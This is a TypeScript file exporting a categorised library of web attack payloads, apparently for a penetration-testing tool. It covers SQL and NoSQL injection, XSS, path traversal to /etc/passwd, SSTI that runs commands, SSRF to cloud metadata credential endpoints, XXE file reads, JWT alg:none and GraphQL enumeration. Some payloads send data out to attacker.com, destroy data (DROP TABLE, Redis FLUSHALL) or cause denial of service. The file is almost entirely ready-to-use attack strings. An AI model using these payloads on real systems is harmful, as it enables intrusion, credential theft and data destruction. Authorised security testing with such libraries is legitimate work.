export interface PayloadCategory {
  label: string
  color: string
  payloads: { label: string; value: string }[]
}

export const PAYLOAD_LIBRARY: PayloadCategory[] = [
  {
    label: 'SQL Injection',
    color: '#f87171',
    payloads: [
      { label: "Auth bypass", value: "' OR '1'='1" },
      { label: "Auth bypass (comment)", value: "admin'--" },
      { label: "Auth bypass OR 1=1", value: "' OR 1=1--" },
      { label: "UNION null probe", value: "' UNION SELECT NULL--" },
      { label: "UNION 2 cols", value: "' UNION SELECT NULL,NULL--" },
      { label: "UNION 3 cols", value: "' UNION SELECT NULL,NULL,NULL--" },
      { label: "Time-based (MySQL)", value: "1' AND SLEEP(5)--" },
      { label: "Time-based (MSSQL)", value: "1'; WAITFOR DELAY '0:0:5'--" },
      { label: "Time-based (PostgreSQL)", value: "1'; SELECT pg_sleep(5)--" },
      { label: "Error-based (MySQL)", value: "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--" },
      { label: "Stacked queries", value: "1; DROP TABLE users--" },
      { label: "Boolean blind true", value: "1' AND 1=1--" },
      { label: "Boolean blind false", value: "1' AND 1=2--" },
      { label: "OOB DNS (MySQL)", value: "1' AND LOAD_FILE(CONCAT('\\\\\\\\',VERSION(),'.attacker.com\\\\a'))--" },
      { label: "Second order", value: "admin'/*" },
    ],
  },
  {
    label: 'NoSQL Injection',
    color: '#fb923c',
    payloads: [
      { label: "Mongo $ne auth bypass (JSON)", value: '{"username": {"$ne": null}, "password": {"$ne": null}}' },
      { label: "Mongo $gt auth bypass", value: '{"username": "admin", "password": {"$gt": ""}}' },
      { label: "Mongo $regex", value: '{"username": {"$regex": ".*"}}' },
      { label: "Mongo $where", value: '{"$where": "sleep(5000)"}' },
      { label: "Mongo $in array", value: '{"username": {"$in": ["admin","root","user"]}}' },
      { label: "URL param $ne", value: "[$ne]=1" },
      { label: "URL param $gt", value: "[$gt]=" },
    ],
  },
  {
    label: 'XSS',
    color: '#facc15',
    payloads: [
      { label: "Script tag", value: "<script>alert(1)</script>" },
      { label: "IMG onerror", value: "<img src=x onerror=alert(1)>" },
      { label: "SVG onload", value: "<svg onload=alert(1)>" },
      { label: "Body onload", value: "<body onload=alert(1)>" },
      { label: "iframe srcdoc", value: '<iframe srcdoc="<script>alert(1)</script>">' },
      { label: "Javascript URL", value: "javascript:alert(1)" },
      { label: "Encoded script", value: "<script>alert&#40;1&#41;</script>" },
      { label: "Double-encoded", value: "%3Cscript%3Ealert(1)%3C/script%3E" },
      { label: "HTML entity bypass", value: "&lt;script&gt;alert(1)&lt;/script&gt;" },
      { label: "DOM XSS sink", value: "'-alert(1)-'" },
      { label: "Angular template", value: "{{constructor.constructor('alert(1)')()}}" },
      { label: "Polyglot", value: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//" },
    ],
  },
  {
    label: 'Path Traversal',
    color: '#a78bfa',
    payloads: [
      { label: "Unix /etc/passwd", value: "../../../../etc/passwd" },
      { label: "Unix encoded", value: "..%2F..%2F..%2F..%2Fetc%2Fpasswd" },
      { label: "Unix double encoded", value: "..%252F..%252Fetc%252Fpasswd" },
      { label: "Windows system.ini", value: "..\\..\\..\\windows\\system.ini" },
      { label: "Windows encoded", value: "..%5C..%5Cwindows%5Csystem.ini" },
      { label: "Null byte bypass", value: "../../../../etc/passwd%00" },
      { label: "Dot bypass", value: "....//....//....//etc/passwd" },
      { label: "Unicode bypass", value: "..%c0%af..%c0%afetc/passwd" },
      { label: "Proc self environ", value: "/proc/self/environ" },
      { label: "Proc self cmdline", value: "/proc/self/cmdline" },
    ],
  },
  {
    label: 'SSTI',
    color: '#34d399',
    payloads: [
      { label: "Generic detect", value: "{{7*7}}" },
      { label: "Jinja2 detect", value: "{{7*'7'}}" },
      { label: "Jinja2 RCE", value: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}" },
      { label: "Twig detect", value: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}" },
      { label: "FreeMarker RCE", value: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}' },
      { label: "Velocity RCE", value: '#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("exec","".class).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")' },
      { label: "Pebble detect", value: "{{7*7}}" },
      { label: "Smarty detect", value: "{$smarty.version}" },
      { label: "Mako detect", value: "${7*7}" },
      { label: "ERB detect", value: "<%= 7*7 %>" },
    ],
  },
  {
    label: 'SSRF',
    color: '#60a5fa',
    payloads: [
      { label: "Localhost HTTP", value: "http://localhost/" },
      { label: "127.0.0.1", value: "http://127.0.0.1/" },
      { label: "0.0.0.0", value: "http://0.0.0.0/" },
      { label: "IPv6 loopback", value: "http://[::1]/" },
      { label: "AWS metadata", value: "http://169.254.169.254/latest/meta-data/" },
      { label: "AWS metadata (IMDSv2 token)", value: "http://169.254.169.254/latest/meta-data/iam/security-credentials/" },
      { label: "GCP metadata", value: "http://metadata.google.internal/computeMetadata/v1/?recursive=true" },
      { label: "Azure metadata", value: "http://169.254.169.254/metadata/instance?api-version=2021-02-01" },
      { label: "DNS rebind bypass", value: "http://localtest.me/" },
      { label: "Decimal IP", value: "http://2130706433/" },
      { label: "Octal IP", value: "http://0177.0.0.1/" },
      { label: "Hex IP", value: "http://0x7f000001/" },
      { label: "Short URL bypass", value: "http://spoofed.burpcollaborator.net" },
      { label: "File scheme", value: "file:///etc/passwd" },
      { label: "Dict scheme", value: "dict://localhost:11211/stat" },
      { label: "Gopher Redis FLUSHALL", value: "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A" },
    ],
  },
  {
    label: 'XXE',
    color: '#f472b6',
    payloads: [
      {
        label: "Basic file read", value:
`<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>`
      },
      {
        label: "SSRF via XXE", value:
`<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>`
      },
      {
        label: "OOB exfil", value:
`<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<root/>`,
      },
      {
        label: "Billion laughs DoS", value:
`<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>`
      },
      {
        label: "CDATA bypass filter", value:
`<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % stuff SYSTEM "file:///etc/passwd">
  <!ENTITY % end "]]>">
  <!ENTITY % all "<!ENTITY joined '%start;%stuff;%end;'>">
  %all;
]>
<root>&joined;</root>`
      },
    ],
  },
  {
    label: 'GraphQL Enum',
    color: '#22d3ee',
    payloads: [
      {
        label: "Full introspection", value:
`query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { ...FullType }
    directives { name description locations args { ...InputValue } }
  }
}
fragment FullType on __Type {
  kind name description
  fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }
  possibleTypes { ...TypeRef }
}
fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue }
fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } }`
      },
      { label: "__schema types only", value: "{ __schema { types { name kind } } }" },
      { label: "Query type fields", value: "{ __type(name: \"Query\") { fields { name type { name kind } } } }" },
      { label: "Mutation type fields", value: "{ __type(name: \"Mutation\") { fields { name args { name type { name } } } } }" },
      { label: "All users (common)", value: "{ users { id email role password } }" },
      { label: "Admin user dump", value: '{ user(id: 1) { id email role isAdmin token } }' },
      { label: "Batch query bypass", value: '[{"query":"{ user(id:1){email}}" },{"query":"{ user(id:2){email}}"}]' },
      { label: "Alias batching", value: "{ a:user(id:1){email} b:user(id:2){email} c:user(id:3){email} }" },
      { label: "Field suggestion probe", value: "{ usr { id } }" },
      { label: "Nested resource dump", value: "{ users { id email orders { id total items { name price } } } }" },
      { label: "IDOR via ID enum", value: "{ user(id: 2) { id email role } }" },
      { label: "Disable introspection bypass", value: "query{__schema{types{name}}}" },
      { label: "Fragment cycle DoS", value: "fragment a on Query { ...b } fragment b on Query { ...a } { ...a }" },
    ],
  },
  {
    label: 'Auth Bypass',
    color: '#f97316',
    payloads: [
      { label: "JWT alg:none", value: '{"alg":"none","typ":"JWT"}' },
      { label: "JWT alg:NONE", value: '{"alg":"NONE","typ":"JWT"}' },
      { label: "JWT empty secret payload", value: '{"sub":"admin","role":"admin","iat":1}' },
      { label: "X-Forwarded-For 127.0.0.1", value: "127.0.0.1" },
      { label: "X-Real-IP 127.0.0.1", value: "127.0.0.1" },
      { label: "X-Original-URL /admin", value: "/admin" },
      { label: "HTTP method override (header)", value: "DELETE" },
      { label: "IDOR id=0", value: "0" },
      { label: "IDOR id=-1", value: "-1" },
      { label: "Mass assignment admin:true (JSON)", value: '{"admin":true,"role":"admin","isAdmin":true}' },
    ],
  },
]
